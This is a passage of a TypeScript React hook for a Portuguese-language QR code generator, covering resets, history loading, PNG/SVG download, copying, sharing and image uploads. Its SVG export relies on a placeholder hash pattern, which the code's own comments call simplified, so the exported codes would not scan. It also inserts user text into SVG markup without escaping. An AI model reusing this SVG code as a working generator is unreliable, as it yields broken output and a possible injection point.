        description: "Ocorreu um erro ao gerar o QR Code. Tente novamente.",
        variant: "destructive",
      })
    } finally {
      setIsLoading(false)
    }
  }, [
    qrState,
    toast,
    isMobile,
    onCloseControls,
    sanitizeAndValidateUrl,
    escapeVCardString,
    formatDateForVEvent,
    sendToExternalService,
  ])

  const handleContentTypeChange = useCallback(
      (novoTipo: TipoConteudoQR) => {
        const tipoParaReset = qrState.tipoConteudoAtivo
        qrState.resetCamposEspecificos(tipoParaReset)
        qrState.updateField("tipoConteudoAtivo", novoTipo)
      },
      [qrState],
  )

  // Reset granular melhorado
  const resetGranular = useCallback(
      (tipo: string) => {
        switch (tipo) {
          case "content":
            // Reset apenas dados do conteúdo atual
            qrState.resetCamposEspecificos(qrState.tipoConteudoAtivo)
            qrState.updateField("qrValue", "")
            toast({
              title: "🗑️ Dados Limpos!",
              description: `Dados de ${qrState.tipoConteudoAtivo} foram removidos`,
            })
            break

          case "appearance":
          case "basic":
            // Reset configurações básicas de aparência
            qrState.updateField("corFrente", "#000000")
            qrState.updateField("corFundo", "#FFFFFF")
            qrState.updateField("tamanho", 256)
            qrState.updateField("nivelCorrecaoErro", "H")
            qrState.updateField("zonaQuieta", 4)
            toast({
              title: "🎨 Aparência Resetada!",
              description: "Cores e configurações básicas foram restauradas",
            })
            break

          case "logo":
            // Reset apenas logo
            qrState.updateField("logoDataUri", "")
            qrState.updateField("logoTamanhoRatio", 0.2)
            qrState.updateField("escavarLogo", true)
            qrState.updateField("habilitarCustomizacaoLogo", false)
            if (fileInputRef.current) fileInputRef.current.value = ""

            // Remover do accordion mobile
            const novosValores = qrState.valoresAccordionMobile.filter((v: string) => v !== "logo")
            qrState.updateField("valoresAccordionMobile", novosValores)

            toast({
              title: "🖼️ Logo Removido!",
              description: "Logo personalizado foi removido",
            })
            break

          case "background":
            // Reset apenas fundo
            qrState.updateField("imagemFundo", "")
            qrState.updateField("habilitarCustomizacaoFundo", false)
            if (backgroundImageInputRef.current) backgroundImageInputRef.current.value = ""

            // Remover do accordion mobile
            const novosValoresBg = qrState.valoresAccordionMobile.filter((v: string) => v !== "background")
            qrState.updateField("valoresAccordionMobile", novosValoresBg)

            toast({
              title: "🌄 Fundo Removido!",
              description: "Imagem de fundo foi removida",
            })
            break

          case "frame":
            // Reset apenas frame
            qrState.updateField("tipoFrameSelecionado", "none")
            qrState.updateField("textoFrame", "")
            qrState.updateField("habilitarCustomizacaoFrame", false)

            // Remover do accordion mobile
            const novosValoresFrame = qrState.valoresAccordionMobile.filter((v: string) => v !== "frame")
            qrState.updateField("valoresAccordionMobile", novosValoresFrame)

            toast({
              title: "🖼️ Moldura Removida!",
              description: "Moldura personalizada foi removida",
            })
            break

          default:
            // Reset completo (comportamento original)
            qrState.updateField("qrValue", "")
            qrState.updateField("corFrente", "#000000")
            qrState.updateField("corFundo", "#FFFFFF")
            qrState.updateField("tamanho", 256)
            qrState.updateField("nivelCorrecaoErro", "H")
            qrState.updateField("zonaQuieta", 4)
            qrState.updateField("logoDataUri", "")
            qrState.updateField("logoTamanhoRatio", 0.2)
            qrState.updateField("escavarLogo", true)
            qrState.updateField("imagemFundo", "")
            qrState.updateField("tipoFrameSelecionado", "none")
            qrState.updateField("textoFrame", "")
            qrState.updateField("habilitarCustomizacaoLogo", false)
            qrState.updateField("habilitarCustomizacaoFundo", false)
            qrState.updateField("habilitarCustomizacaoFrame", false)
            qrState.updateField("valoresAccordionMobile", [])
            qrState.resetCamposEspecificos()

            if (fileInputRef.current) fileInputRef.current.value = ""
            if (backgroundImageInputRef.current) backgroundImageInputRef.current.value = ""

            urlValidationCache.clear()

            toast({
              title: "🔄 Tudo Resetado!",
              description: "QR Code, campos e configurações foram limpos completamente",
            })
        }
      },
      [qrState, toast],
  )

  const resetAppearanceCustomization = useCallback(() => {
    resetGranular("all")
  }, [resetGranular])

  const loadFromHistory = useCallback(
      (entrada: EntradaQRCode) => {
        qrState.resetCamposEspecificos()
        qrState.updateField("tipoConteudoAtivo", entrada.tipoConteudo)

        // Carregar campos específicos por tipo
        if (entrada.tipoConteudo === "url") {
          qrState.updateField("inputUrl", entrada.inputOriginal)
        }

        // WiFi
        qrState.updateField("wifiSsid", entrada.wifiSsid || "")
        qrState.updateField("wifiSenha", entrada.wifiSenha || "")
        qrState.updateField("wifiEncriptacao", entrada.wifiEncriptacao || "WPA")
        qrState.updateField("wifiOculto", entrada.wifiOculto || false)

        // vCard
        qrState.updateField("vcardNome", entrada.vcardNome || "")
        qrState.updateField("vcardSobrenome", entrada.vcardSobrenome || "")
        qrState.updateField("vcardOrganizacao", entrada.vcardOrganizacao || "")
        qrState.updateField("vcardTitulo", entrada.vcardTitulo || "")
        qrState.updateField("vcardTelefone", entrada.vcardTelefone || "")
        qrState.updateField("vcardEmail", entrada.vcardEmail || "")
        qrState.updateField("vcardWebsite", entrada.vcardWebsite || "")
        qrState.updateField("vcardEndereco", entrada.vcardEndereco || "")
        qrState.updateField("vcardCidade", entrada.vcardCidade || "")
        qrState.updateField("vcardEstado", entrada.vcardEstado || "")
        qrState.updateField("vcardCep", entrada.vcardCep || "")
        qrState.updateField("vcardPais", entrada.vcardPais || "")

        // vEvent
        qrState.updateField("veventResumo", entrada.veventResumo || "")
        qrState.updateField("veventDescricao", entrada.veventDescricao || "")
        qrState.updateField("veventLocalizacao", entrada.veventLocalizacao || "")
        qrState.updateField("veventDataInicio", entrada.veventDataInicio || "")
        qrState.updateField("veventHoraInicio", entrada.veventHoraInicio || "")
        qrState.updateField("veventDataFim", entrada.veventDataFim || "")
        qrState.updateField("veventHoraFim", entrada.veventHoraFim || "")
        qrState.updateField("veventDiaTodo", entrada.veventDiaTodo || false)

        // Email
        qrState.updateField("emailPara", entrada.emailPara || "")
        qrState.updateField("emailAssunto", entrada.emailAssunto || "")
        qrState.updateField("emailCorpo", entrada.emailCorpo || "")

        // SMS
        qrState.updateField("smsPara", entrada.smsPara || "")
        qrState.updateField("smsCorpo", entrada.smsCorpo || "")

        // Geo
        qrState.updateField("geoLatitude", entrada.geoLatitude || "")
        qrState.updateField("geoLongitude", entrada.geoLongitude || "")

        // WhatsApp
        qrState.updateField("whatsappPara", entrada.whatsappPara || "")
        qrState.updateField("whatsappMensagem", entrada.whatsappMensagem || "")

        // Phone
        qrState.updateField("telefonePara", entrada.telefonePara || "")

        // PIX
        qrState.updateField("pixChave", entrada.pixChave || "")
        qrState.updateField("pixNome", entrada.pixNome || "")
        qrState.updateField("pixCidade", entrada.pixCidade || "")
        qrState.updateField("pixValor", entrada.pixValor || "")
        qrState.updateField("pixDescricao", entrada.pixDescricao || "")

        // App Store
        qrState.updateField("appstorePlataforma", entrada.appstorePlataforma || "ambos")
        qrState.updateField("appstoreIosUrl", entrada.appstoreIosUrl || "")
        qrState.updateField("appstoreAndroidUrl", entrada.appstoreAndroidUrl || "")
        qrState.updateField("appstoreNome", entrada.appstoreNome || "")

        // Spotify/YouTube
        qrState.updateField("spotifyTipo", entrada.spotifyTipo || "track")
        qrState.updateField("spotifyUrl", entrada.spotifyUrl || "")
        qrState.updateField("spotifyTitulo", entrada.spotifyTitulo || "")
        qrState.updateField("spotifyArtista", entrada.spotifyArtista || "")

        // Zoom/Meet
        qrState.updateField("zoomTipo", entrada.zoomTipo || "zoom")
        qrState.updateField("zoomUrl", entrada.zoomUrl || "")
        qrState.updateField("zoomId", entrada.zoomId || "")
        qrState.updateField("zoomSenha", entrada.zoomSenha || "")
        qrState.updateField("zoomTitulo", entrada.zoomTitulo || "")

        // Menu
        qrState.updateField("menuNome", entrada.menuNome || "")
        qrState.updateField("menuDescricao", entrada.menuDescricao || "")
        qrState.updateField("menuItens", entrada.menuItens || "")
        qrState.updateField("menuPreco", entrada.menuPreco || "")
        qrState.updateField("menuCategoria", entrada.menuCategoria || "")

        // Cupom
        qrState.updateField("cupomCodigo", entrada.cupomCodigo || "")
        qrState.updateField("cupomDescricao", entrada.cupomDescricao || "")
        qrState.updateField("cupomValor", entrada.cupomValor || "")
        qrState.updateField("cupomValidade", entrada.cupomValidade || "")
        qrState.updateField("cupomTipo", entrada.cupomTipo || "desconto")

        // Aparência
        qrState.updateField("qrValue", entrada.valorQR)
        qrState.updateField("corFrente", entrada.corFrente)
        qrState.updateField("corFundo", entrada.corFundo)
        qrState.updateField("tamanho", entrada.tamanho)
        qrState.updateField("nivelCorrecaoErro", entrada.nivel)
        qrState.updateField("zonaQuieta", entrada.margem)

        // Customizações
        const novosValoresAccordion: string[] = []

        qrState.updateField("habilitarCustomizacaoLogo", !!entrada.habilitarCustomizacaoLogo)
        qrState.updateField("habilitarCustomizacaoFundo", !!entrada.habilitarCustomizacaoFundo)
        qrState.updateField("habilitarCustomizacaoFrame", !!entrada.habilitarCustomizacaoFrame)

        if (entrada.habilitarCustomizacaoLogo) novosValoresAccordion.push("logo")
        if (entrada.habilitarCustomizacaoFundo) novosValoresAccordion.push("background")
        if (entrada.habilitarCustomizacaoFrame) novosValoresAccordion.push("frame")

        // Verificar se tem aparência não padrão
        const temAparenciaNaoPadrao =
            entrada.corFrente !== "#000000" ||
            entrada.corFundo !== "#FFFFFF" ||
            entrada.tamanho !== 256 ||
            entrada.nivel !== "H" ||
            entrada.margem !== 4

        if (temAparenciaNaoPadrao) {
          novosValoresAccordion.push("appearance")
        }

        qrState.updateField("valoresAccordionMobile", novosValoresAccordion)

        // Logo
        if (entrada.logoDataUri) {
          qrState.updateField("logoDataUri", entrada.logoDataUri)
          qrState.updateField("logoTamanhoRatio", entrada.logoTamanhoRatio || 0.2)
          qrState.updateField("escavarLogo", entrada.escavarLogo === undefined ? true : entrada.escavarLogo)
        } else {
          qrState.updateField("logoDataUri", "")
        }
        if (fileInputRef.current) fileInputRef.current.value = ""

        // Imagem de fundo
        if (entrada.imagemFundo) {
          qrState.updateField("imagemFundo", entrada.imagemFundo)
        } else {
          qrState.updateField("imagemFundo", "")
        }
        if (backgroundImageInputRef.current) backgroundImageInputRef.current.value = ""

        // Frame
        qrState.updateField("tipoFrameSelecionado", entrada.tipoFrameSelecionado || "none")
        qrState.updateField("textoFrame", entrada.textoFrame || "")

        toast({
          title: "📋 Configurações Carregadas",
          description: "As configurações do histórico foram aplicadas",
        })
      },
      [qrState, toast],
  )

  const clearHistory = useCallback(() => {
    qrState.updateField("historico", [])

    toast({
      title: "🗑️ Histórico Limpo",
      description: "Todo o histórico foi removido com sucesso",
    })
  }, [qrState, toast])

  const getFormattedDate = () => {
    const now = new Date()
    return `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, "0")}-${String(now.getDate()).padStart(2, "0")}_${String(now.getHours()).padStart(2, "0")}-${String(now.getMinutes()).padStart(2, "0")}-${String(now.getSeconds()).padStart(2, "0")}`
  }

  // Função para criar SVG do QR Code MUITO melhorada
  const createAdvancedQRCodeSVG = useCallback(
      (
          qrValue: string,
          size: number,
          fgColor: string,
          bgColor: string,
          frameType: string,
          frameText: string,
          logoDataUri?: string,
          logoSize?: number,
          backgroundImage?: string,
      ) => {
        const frameHeight =
            frameType !== "none" &&
            (frameType === "textBottom" ||
                frameType === "scanMeBottom" ||
                frameType === "roundedBorderTextBottom" ||
                frameType === "topBottomText")
                ? FRAME_TEXT_AREA_HEIGHT
                : 0

        const totalHeight = size + frameHeight + (frameType !== "none" ? FRAME_PADDING * 2 : 0)
        const totalWidth = size + (frameType !== "none" ? FRAME_PADDING * 2 : 0)

        // Gerar padrão QR Code simplificado (para produção, usar biblioteca real)
        const qrPattern = generateSimpleQRPattern(qrValue, size)

        const svgContent = `
<svg width="${totalWidth}" height="${totalHeight}" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 ${totalWidth} ${totalHeight}">
  <defs>
    ${backgroundImage ? `<pattern id="bgPattern" patternUnits="userSpaceOnUse" width="${totalWidth}" height="${totalHeight}"><image href="${backgroundImage}" width="${totalWidth}" height="${totalHeight}" preserveAspectRatio="xMidYMid slice"/></pattern>` : ""}
    ${logoDataUri ? `<image id="logo" href="${logoDataUri}" width="${logoSize || 50}" height="${logoSize || 50}"/>` : ""}
    <style>
      .qr-module { fill: ${fgColor}; }
      .qr-bg { fill: ${backgroundImage ? "url(#bgPattern)" : bgColor}; }
      .frame-text { font-family: Arial, sans-serif; font-weight: bold; text-anchor: middle; }
      .frame-border { fill: none; stroke: ${fgColor}; stroke-width: 2; }
    </style>
  </defs>
  
  <!-- Background -->
  <rect width="100%" height="100%" class="qr-bg"/>
  
  <!-- Frame background if needed -->
  ${frameType !== "none" ? `<rect x="${FRAME_PADDING}" y="${FRAME_PADDING}" width="${size}" height="${size}" class="qr-bg" stroke="${fgColor}" stroke-width="2"/>` : ""}
  
  <!-- QR Code pattern -->
  <g transform="translate(${frameType !== "none" ? FRAME_PADDING : 0}, ${frameType !== "none" ? FRAME_PADDING : 0})">
    ${qrPattern}
  </g>
  
  <!-- Logo if present -->
  ${logoDataUri ? `<use href="#logo" x="${(totalWidth - (logoSize || 50)) / 2}" y="${(size - (logoSize || 50)) / 2 + (frameType !== "none" ? FRAME_PADDING : 0)}"/>` : ""}
  
  <!-- Frame decorations -->
  ${renderFrameDecorations(frameType, totalWidth, size, FRAME_PADDING, fgColor)}
  
  <!-- Frame text -->
  ${frameHeight > 0 ? renderFrameText(frameType, frameText, totalWidth, size, FRAME_PADDING, frameHeight, fgColor) : ""}
</svg>`

        return svgContent
      },
      [],
  )

  // Função auxiliar para gerar padrão QR simplificado
  const generateSimpleQRPattern = (value: string, size: number) => {
    const modules = 25 // Simplificado para demonstração
    const moduleSize = size / modules
    let pattern = ""

    // Gerar padrão baseado no hash do valor (simplificado)
    const hash = value.split("").reduce((a, b) => {
      a = (a << 5) - a + b.charCodeAt(0)
      return a & a
    }, 0)

    for (let y = 0; y < modules; y++) {
      for (let x = 0; x < modules; x++) {
        // Lógica simplificada para determinar se o módulo deve ser preenchido
        const shouldFill = (hash + x * y) % 3 === 0
        if (shouldFill) {
          pattern += `<rect x="${x * moduleSize}" y="${y * moduleSize}" width="${moduleSize}" height="${moduleSize}" class="qr-module"/>`
        }
      }
    }

    return pattern
  }

  // Função auxiliar para renderizar decorações do frame
  const renderFrameDecorations = (
      frameType: string,
      totalWidth: number,
      size: number,
      padding: number,
      color: string,
  ) => {
    switch (frameType) {
      case "decorativeBorder":
        const cornerSize = 20
        return `
          <!-- Decorative corners -->
          <path d="M${padding},${padding + cornerSize} L${padding},${padding} L${padding + cornerSize},${padding}" class="frame-border"/>
          <path d="M${totalWidth - padding - cornerSize},${padding} L${totalWidth - padding},${padding} L${totalWidth - padding},${padding + cornerSize}" class="frame-border"/>
          <path d="M${totalWidth - padding},${size + padding - cornerSize} L${totalWidth - padding},${size + padding} L${totalWidth - padding - cornerSize},${size + padding}" class="frame-border"/>
          <path d="M${padding + cornerSize},${size + padding} L${padding},${size + padding} L${padding},${size + padding - cornerSize}" class="frame-border"/>
        `
      case "roundedBorderTextBottom":
        return `<rect x="${padding}" y="${padding}" width="${size}" height="${size}" rx="10" ry="10" class="frame-border"/>`
      case "modernFrame":
        return `
          <rect x="${padding}" y="${padding}" width="${size}" height="${size}" class="frame-border"/>
          <rect x="${padding + 5}" y="${padding + 5}" width="${size - 10}" height="${size - 10}" fill="none" stroke="${color}" stroke-width="1" opacity="0.5"/>
        `
      case "classicFrame":
        return `
          <rect x="${padding}" y="${padding}" width="${size}" height="${size}" fill="none" stroke="${color}" stroke-width="4"/>
          <rect x="${padding + 4}" y="${padding + 4}" width="${size - 8}" height="${size - 8}" fill="none" stroke="${color}" stroke-width="2"/>
        `
      default:
        return ""
    }
  }

  // Função auxiliar para renderizar texto do frame
  const renderFrameText = (
      frameType: string,
      frameText: string,
      totalWidth: number,
      size: number,
      padding: number,
      frameHeight: number,
      color: string,
  ) => {
    const text = frameType === "scanMeBottom" ? "SCAN ME" : frameText || "QR CODE"
    const textY = size + padding + frameHeight / 2

    switch (frameType) {
      case "topBottomText":
        return `
          <text x="${totalWidth / 2}" y="${padding / 2}" class="frame-text" font-size="14" fill="${color}">QR CODE</text>
          <text x="${totalWidth / 2}" y="${textY}" class="frame-text" font-size="14" fill="${color}">${text}</text>
        `
      default:
        return `<text x="${totalWidth / 2}" y="${textY}" class="frame-text" font-size="16" fill="${color}">${text}</text>`
    }
  }

  const handleDownloadQRCode = useCallback(
      (formato: "png" | "svg" = "png") => {
        if (!qrState.qrValue) {
          toast({
            title: "❌ Erro",
            description: "Nenhum QR Code para baixar",
            variant: "destructive",
          })
          return
        }

        try {
          const filename = `qrcode_${getFormattedDate()}.${formato}`

          if (formato === "png") {
            // Aguardar um pouco para garantir que o canvas foi renderizado
            setTimeout(() => {
              const qrCanvas = document.querySelector("canvas") as HTMLCanvasElement
              if (!qrCanvas) {
                toast({
                  title: "❌ Erro",
                  description: "QR Code não encontrado para download",
                  variant: "destructive",
                })
                return
              }

              // Criar canvas para export com frame
              const exportCanvas = document.createElement("canvas")
              const ctx = exportCanvas.getContext("2d")
              if (!ctx) return

              const frameActive = qrState.habilitarCustomizacaoFrame && qrState.tipoFrameSelecionado !== "none"
              const frameHeight =
                  frameActive &&
                  (qrState.tipoFrameSelecionado === "textBottom" ||
                      qrState.tipoFrameSelecionado === "scanMeBottom" ||
                      qrState.tipoFrameSelecionado === "roundedBorderTextBottom" ||
                      qrState.tipoFrameSelecionado === "topBottomText")
                      ? FRAME_TEXT_AREA_HEIGHT
                      : 0

              const totalWidth = qrState.tamanho + (frameActive ? FRAME_PADDING * 2 : 0)
              const totalHeight = qrState.tamanho + frameHeight + (frameActive ? FRAME_PADDING * 2 : 0)

              exportCanvas.width = totalWidth
              exportCanvas.height = totalHeight

              // Fundo
              ctx.fillStyle = qrState.corFundo
              ctx.fillRect(0, 0, totalWidth, totalHeight)

              // Imagem de fundo se houver
              if (qrState.habilitarCustomizacaoFundo && qrState.imagemFundo) {
                const img = new Image()
                img.onload = () => {
                  ctx.drawImage(img, 0, 0, totalWidth, totalHeight)
                  drawQRAndFrame()
                }
                img.src = qrState.imagemFundo
              } else {
                drawQRAndFrame()
              }

              function drawQRAndFrame() {
                const qrX = frameActive ? FRAME_PADDING : 0
                const qrY = frameActive ? FRAME_PADDING : 0

                // Desenhar QR Code
                ctx.drawImage(qrCanvas, qrX, qrY, qrState.tamanho, qrState.tamanho)

                // Desenhar frame se ativo
                if (frameActive) {
                  ctx.strokeStyle = qrState.corFrente
                  ctx.lineWidth = 2

                  if (qrState.tipoFrameSelecionado === "roundedBorderTextBottom") {
                    // Borda arredondada
                    ctx.beginPath()
                    ctx.roundRect(qrX, qrY, qrState.tamanho, qrState.tamanho, FRAME_BORDER_RADIUS)
                    ctx.stroke()
                  } else if (qrState.tipoFrameSelecionado === "decorativeBorder") {
                    // Bordas decorativas nos cantos
                    const cornerSize = 20
                    ctx.strokeStyle = qrState.corFrente
                    ctx.lineWidth = 3

                    // Canto superior esquerdo
                    ctx.beginPath()
                    ctx.moveTo(qrX, qrY + cornerSize)
                    ctx.lineTo(qrX, qrY)
                    ctx.lineTo(qrX + cornerSize, qrY)
                    ctx.stroke()

                    // Canto superior direito
                    ctx.beginPath()
                    ctx.moveTo(qrX + qrState.tamanho - cornerSize, qrY)
                    ctx.lineTo(qrX + qrState.tamanho, qrY)
                    ctx.lineTo(qrX + qrState.tamanho, qrY + cornerSize)
                    ctx.stroke()

                    // Canto inferior esquerdo
                    ctx.beginPath()
                    ctx.moveTo(qrX, qrY + qrState.tamanho - cornerSize)
                    ctx.lineTo(qrX, qrY + qrState.tamanho)
                    ctx.lineTo(qrX + cornerSize, qrY + qrState.tamanho)
                    ctx.stroke()

                    // Canto inferior direito
                    ctx.beginPath()
                    ctx.moveTo(qrX + qrState.tamanho - cornerSize, qrY + qrState.tamanho)
                    ctx.lineTo(qrX + qrState.tamanho, qrY + qrState.tamanho)
                    ctx.lineTo(qrX + qrState.tamanho, qrY + qrState.tamanho - cornerSize)
                    ctx.stroke()
                  } else {
                    // Borda simples
                    ctx.strokeRect(qrX, qrY, qrState.tamanho, qrState.tamanho)
                  }

                  // Texto do frame
                  if (frameHeight > 0) {
                    const text =
                        qrState.tipoFrameSelecionado === "scanMeBottom" ? "SCAN ME" : qrState.textoFrame || "QR CODE"

                    ctx.fillStyle = qrState.corFrente
                    ctx.font = "bold 16px Arial, sans-serif"
                    ctx.textAlign = "center"
                    ctx.textBaseline = "middle"

                    if (qrState.tipoFrameSelecionado === "topBottomText") {
                      // Texto em cima e embaixo
                      ctx.fillText("QR CODE", totalWidth / 2, FRAME_PADDING / 2)
                      ctx.fillText(text, totalWidth / 2, qrY + qrState.tamanho + FRAME_PADDING + frameHeight / 2)
                    } else {
                      ctx.fillText(text, totalWidth / 2, qrY + qrState.tamanho + FRAME_PADDING + frameHeight / 2)
                    }
                  }
                }

                // Finalizar download
                exportCanvas.toBlob((blob) => {
                  if (blob) {
                    const url = URL.createObjectURL(blob)
                    const link = document.createElement("a")
                    link.href = url
                    link.download = filename
                    document.body.appendChild(link)
                    link.click()
                    document.body.removeChild(link)
                    URL.revokeObjectURL(url)

                    toast({
                      title: "📥 Download Concluído!",
                      description: `QR Code baixado como ${filename}`,
                    })
                  }
                }, "image/png")
              }
            }, 100)
          } else {
            // SVG Download avançado
            const svgContent = createAdvancedQRCodeSVG(
                qrState.qrValue,
                qrState.tamanho,
                qrState.corFrente,
                qrState.corFundo,
                qrState.tipoFrameSelecionado,
                qrState.textoFrame,
                qrState.logoDataUri,
                qrState.tamanho * (qrState.logoTamanhoRatio || 0.2),
                qrState.imagemFundo,
            )
            const blob = new Blob([svgContent], { type: "image/svg+xml;charset=utf-8" })
            const url = URL.createObjectURL(blob)
            const link = document.createElement("a")
            link.href = url
            link.download = filename
            document.body.appendChild(link)
            link.click()
            document.body.removeChild(link)
            URL.revokeObjectURL(url)

            toast({
              title: "📥 Download Concluído!",
              description: `QR Code SVG avançado baixado como ${filename}`,
            })
          }
        } catch (error) {
          toast({
            title: "❌ Erro no Download",
            description: "Não foi possível baixar o QR Code",
            variant: "destructive",
          })
        }
      },
      [qrState, toast, createAdvancedQRCodeSVG],
  )

  const handleCopyQRCodeImage = useCallback(async () => {
    if (!qrState.qrValue) {
      toast({
        title: "❌ Erro",
        description: "Nenhum QR Code para copiar",
        variant: "destructive",
      })
      return
    }

    try {
      // Aguardar um pouco para garantir que o canvas foi renderizado
      await new Promise((resolve) => setTimeout(resolve, 100))

      const qrCanvas = document.querySelector("canvas") as HTMLCanvasElement
      if (!qrCanvas) {
        // Fallback: copiar texto se não conseguir a imagem
        try {
          await navigator.clipboard.writeText(qrState.qrValue)
          toast({
            title: "📋 Texto Copiado!",
            description: "Conteúdo do QR Code copiado como texto",
          })
        } catch (error) {
          toast({
            title: "❌ Erro ao Copiar",
            description: "Não foi possível copiar o QR Code",
            variant: "destructive",
          })
        }
        return
      }

      // Tentar copiar como imagem primeiro
      qrCanvas.toBlob(async (blob) => {
        if (blob && navigator.clipboard && window.ClipboardItem) {
          try {
            await navigator.clipboard.write([
              new ClipboardItem({
                "image/png": blob,
              }),
            ])

            toast({
              title: "📋 Imagem Copiada!",
              description: "QR Code copiado como imagem para a área de transferência",
            })
          } catch (error) {
            // Fallback para texto se imagem falhar
            try {
              await navigator.clipboard.writeText(qrState.qrValue)
              toast({
                title: "📋 Texto Copiado!",
                description: "Conteúdo do QR Code copiado como texto (imagem não suportada)",
              })
            } catch (textError) {
              toast({
                title: "❌ Erro ao Copiar",
                description: "Não foi possível copiar o QR Code",
                variant: "destructive",
              })
            }
          }
        } else {
          // Fallback para texto se ClipboardItem não suportado
          try {
            await navigator.clipboard.writeText(qrState.qrValue)
            toast({
              title: "📋 Texto Copiado!",
              description: "Conteúdo do QR Code copiado como texto",
            })
          } catch (error) {
            toast({
              title: "❌ Erro ao Copiar",
              description: "Não foi possível copiar o QR Code",
              variant: "destructive",
            })
          }
        }
      }, "image/png")
    } catch (error) {
      // Último fallback
      try {
        await navigator.clipboard.writeText(qrState.qrValue)
        toast({
          title: "📋 Texto Copiado!",
          description: "Conteúdo do QR Code copiado como texto",
        })
      } catch (textError) {
        toast({
          title: "❌ Erro ao Copiar",
          description: "Não foi possível copiar o QR Code",
          variant: "destructive",
        })
      }
    }
  }, [qrState, toast])

  const handleShareQRCode = useCallback(async () => {
    if (!qrState.qrValue) {
      toast({
        title: "❌ Erro",
        description: "Nenhum QR Code para compartilhar",
        variant: "destructive",
      })
      return
    }

    try {
      // Aguardar um pouco para garantir que o canvas foi renderizado
      setTimeout(() => {
        const qrCanvas = document.querySelector("canvas") as HTMLCanvasElement
        if (!qrCanvas) {
          toast({
            title: "❌ Erro",
            description: "QR Code não encontrado para compartilhamento",
            variant: "destructive",
          })
          return
        }

        qrCanvas.toBlob(async (blob) => {
          if (blob && navigator.share) {
            try {
              const file = new File([blob], `qrcode_${getFormattedDate()}.png`, { type: "image/png" })

              // Verificar se o navegador suporta compartilhamento de arquivos
              if (navigator.canShare && navigator.canShare({ files: [file] })) {
                await navigator.share({
                  title: "QR Code Gerado",
                  text: "Confira este QR Code que criei!",
                  files: [file],
                })

                toast({
                  title: "📤 Compartilhado!",
                  description: "QR Code compartilhado com sucesso",
                })
              } else {
                // Fallback para compartilhamento sem arquivo
                await navigator.share({
                  title: "QR Code Gerado",
                  text: `Confira este QR Code: ${qrState.qrValue}`,
                  url: window.location.href,
                })

                toast({
                  title: "📤 Compartilhado!",
                  description: "Link compartilhado com sucesso",
                })
              }
            } catch (error) {
              if ((error as Error).name !== "AbortError") {
                // Fallback: copiar para clipboard
                if (navigator.clipboard && window.ClipboardItem) {
                  try {
                    await navigator.clipboard.write([
                      new ClipboardItem({
                        "image/png": blob,
                      }),
                    ])

                    toast({
                      title: "📋 Copiado!",
                      description: "QR Code copiado para área de transferência (compartilhamento não suportado)",
                    })
                  } catch (error) {
                    toast({
                      title: "❌ Erro ao Compartilhar",
                      description: "Não foi possível compartilhar o QR Code",
                      variant: "destructive",
                    })
                  }
                } else {
                  toast({
                    title: "❌ Não Suportado",
                    description: "Compartilhamento não suportado neste navegador",
                    variant: "destructive",
                  })
                }
              }
            }
          } else {
            // Fallback: copiar para clipboard
            if (navigator.clipboard && window.ClipboardItem) {
              try {
                await navigator.clipboard.write([
                  new ClipboardItem({
                    "image/png": blob,
                  }),
                ])

                toast({
                  title: "📋 Copiado!",
                  description: "QR Code copiado para área de transferência (compartilhamento não suportado)",
                })
              } catch (error) {
                toast({
                  title: "❌ Não Suportado",
                  description: "Compartilhamento não suportado neste navegador",
                  variant: "destructive",
                })
              }
            }
          }
        }, "image/png")
      }, 100)
    } catch (error) {
      toast({
        title: "❌ Erro",
        description: "Não foi possível compartilhar o QR Code",
        variant: "destructive",
      })
    }
  }, [qrState, toast])

  const handleLogoUpload = useCallback(
      (event: React.ChangeEvent<HTMLInputElement>) => {
        const file = event.target.files?.[0]
        if (file) {
          if (!file.type.startsWith("image/")) {
            toast({
              title: "❌ Erro no Upload",
              description: "Por favor, selecione um arquivo de imagem válido.",
              variant: "destructive",
            })
            if (fileInputRef.current) fileInputRef.current.value = ""
            return
          }

          // Verificar tamanho do arquivo (máximo 5MB)
          if (file.size > 5 * 1024 * 1024) {
            toast({
              title: "❌ Arquivo Muito Grande",
              description: "Por favor, selecione uma imagem menor que 5MB.",
              variant: "destructive",
            })
            if (fileInputRef.current) fileInputRef.current.value = ""
            return
          }

          const reader = new FileReader()
          reader.onloadend = () => {
            qrState.updateField("logoDataUri", reader.result as string)

            toast({
              title: "🖼️ Logo Carregado!",
              description: "Logo foi carregado com sucesso!",
            })
          }
          reader.onerror = () =>
              toast({
                title: "❌ Erro de Leitura",
                description: "Erro ao ler o arquivo.",
                variant: "destructive",
              })
          reader.readAsDataURL(file)
        }
      },
      [qrState, toast],
  )

  const handleBackgroundImageUpload = useCallback(
      (event: React.ChangeEvent<HTMLInputElement>) => {
        const file = event.target.files?.[0]
        if (file) {
          if (!file.type.startsWith("image/")) {
            toast({
              title: "❌ Erro no Upload",
              description: "Por favor, selecione um arquivo de imagem válido.",
              variant: "destructive",
            })
            if (backgroundImageInputRef.current) backgroundImageInputRef.current.value = ""
            return
          }

          // Verificar tamanho do arquivo (máximo 10MB)
          if (file.size > 10 * 1024 * 1024) {
            toast({
              title: "❌ Arquivo Muito Grande",
              description: "Por favor, selecione uma imagem menor que 10MB.",
              variant: "destructive",
            })
            if (backgroundImageInputRef.current) backgroundImageInputRef.current.value = ""
            return
          }

          const reader = new FileReader()
          reader.onloadend = () => {
            qrState.updateField("imagemFundo", reader.result as string)

            toast({
              title: "🌄 Imagem de Fundo Carregada!",
              description: "Imagem de fundo foi carregada com sucesso!",
            })
          }
          reader.onerror = () =>
              toast({
                title: "❌ Erro de Leitura",
                description: "Erro ao ler o arquivo.",
                variant: "destructive",
              })
          reader.readAsDataURL(file)
        }
      },
      [qrState, toast],
  )

  const removeBackgroundImageFile = useCallback(() => {
    qrState.updateField("imagemFundo", "")
    if (backgroundImageInputRef.current) {
      backgroundImageInputRef.current.value = ""
    }

    toast({
      title: "🗑️ Imagem Removida!",
      description: "Imagem de fundo foi removida com sucesso.",
    })
  }, [qrState, toast])

  return {
    isLoading,
    fileInputRef,
    backgroundImageInputRef,
    handleGenerateQRCode,
    handleContentTypeChange,
    resetAppearanceCustomization,
    resetGranular,
    loadFromHistory,
    clearHistory,
    handleDownloadQRCode,
    handleCopyQRCodeImage,
    handleShareQRCode,
    handleLogoUpload,
    handleBackgroundImageUpload,
    removeBackgroundImageFile,
  }
}